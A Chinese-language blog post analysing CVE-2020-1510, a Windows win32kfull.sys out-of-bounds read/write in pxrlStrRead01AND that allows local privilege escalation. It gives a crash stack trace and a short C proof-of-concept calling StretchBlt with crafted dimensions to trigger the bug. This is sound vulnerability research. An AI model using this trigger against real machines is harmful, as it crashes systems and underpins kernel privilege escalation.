# CVE-2020-1510 漏洞分析 - 紅人 - 博客园

> 原文：[`www.cnblogs.com/feizianquan/p/17160090.html`](https://www.cnblogs.com/feizianquan/p/17160090.html)

### 0x00 漏洞信息

漏洞影响：本地提权

漏洞文件：win32kfull.sys

漏洞函数：pxrlStrRead01AND

漏洞原因：越界读写

分析系统：Windows 1903

### [【漏洞分析合集】](https://www.cnblogs.com/feizianquan/p/10882161.html)

### 0x01 漏洞分析

崩溃时的堆栈：

```
nt!KeBugCheckEx+0x107 nt!MiSystemFault+0x1d3171 nt!MmAccessFault+0x34f nt!KiPageFault+0x360 win32kfull!pxrlStrRead01AND+0x5b win32kfull!EngStretchBltNew+0xdc9 win32kfull!EngStretchBlt+0xd1 win32kfull!EngStretchBltROP+0x157 win32kfull!BLTRECORD::bStretch+0x37e win32kfull!GreStretchBltInternal+0x721 win32kfull!NtGdiStretchBlt+0x68
```

和 CVE-2020-1247 漏洞原因一样只是触发位置不一样

### 0x02 验证 poc

```
#include <Windows.h>

int main()
{
    HDC r0 = CreateCompatibleDC(0x0);
    HBITMAP r1 = CreateCompatibleBitmap(r0, 0x3, 0x1);
    SelectObject(r0, r1);
    HDC  r2 = GetWindowDC(0x0);
    StretchBlt(r0, 0x0, 0x0, 0x800, 0x1, r2, 0x0, 0x7, 0xffffffffffeffff4, 0xfffffffffffffff8, 0xcc001c); return 0;
}
```

要开启特殊池稳定触发

方法看

# [CVE-2020-1247 漏洞分析](https://www.cnblogs.com/feizianquan/p/17154707.html)